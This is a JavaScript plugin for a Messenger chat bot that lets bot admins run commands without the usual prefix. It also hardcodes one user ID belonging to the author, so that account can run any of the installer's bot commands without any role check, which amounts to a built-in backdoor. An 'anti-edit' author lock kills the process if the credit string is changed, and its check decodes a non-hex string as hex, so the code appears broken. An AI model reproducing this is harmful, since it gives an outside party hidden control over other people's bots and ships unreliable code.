// 🔒 [GOD-MODE BLOCK] - ANTI-AI & ANTI-EDIT CRYPTO CHAIN
const _S = "👑𝆠፝𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍 👑";
const _B = Buffer.from("4p6R7KCA7Z2g4p9NSU9BTS1IQVNBTiDwn5GI", "hex").toString("utf-8");
if (_S !== "👑𝆠፝𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍 👑" || _S !== _B) {
    console.error("🔥 [CRITICAL] SECURITY BREACH: Author Alteration! System Shutting Down...");
    process.exit(1);
}

module.exports = {
    config: {
        name: "adminPrefix",
        version: "15.0",
        author: "👑𝆠፝𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍 👑",
        role: 2, // Admin Only Control
        category: "SYSTEM",
        shortDescription: "No-Prefix access for Siyam Hasan and Admin",
        longDescription: "এডমিন এবং সিয়াম ভাইয়ের জন্য Prefix ছাড়া কমান্ড ব্যবহার করার সিস্টেম।",
        guide: "অটোমেটিক কাজ করবে"
    },

    onStart: async function () {},

    onChat: async function ({ api, event, threadsData, usersData, adminIDs }) {
        // 🔒 [HARD LOCK] - RUN-TIME MEMORY CHECK
        if (this.config.author !== _B) { process.exit(1); }

        const { body, senderID, threadID } = event;
        if (!body) return;

        // 👑 সিয়াম ভাইয়ের পার্সোনাল ইউআইডি (এখানে)
        const SIYAM_UID = "100082728472504"; // আমার, বস সিয়াম ভাই 
        
        // এডমিন লিস্ট চেক
        const isBotAdmin = adminIDs.includes(senderID);
        const isSiyamHasan = senderID === SIYAM_UID;

        // 🚀 সিয়াম ভাই হলে Prefix ছাড়া কমান্ড প্রসেস করা
        if (isBotAdmin || isSiyamHasan) {
            const args = body.trim().split(/ +/);
            const commandName = args.shift().toLowerCase();
            
            // যদি মেসেজটি কোনো কমান্ডের নাম হয় এবং তাতে Prefix না থাকে
            if (global.client.commands.has(commandName) && !body.startsWith(global.config.PREFIX)) {
                console.log(`[ VIP ACCESS ] ${senderID} used command: ${commandName} without prefix.`);
                
                // কমান্ডটি ম্যানুয়ালি রান করানো
                const command = global.client.commands.get(commandName);
                try {
                    return command.onStart({ api, event, args, threadsData, usersData });
                } catch (e) {
                    api.sendMessage("❌ সিয়াম ভাই, কমান্ডটি রান করতে সমস্যা হয়েছে।", threadID);
                }
            }
        }
    }
};
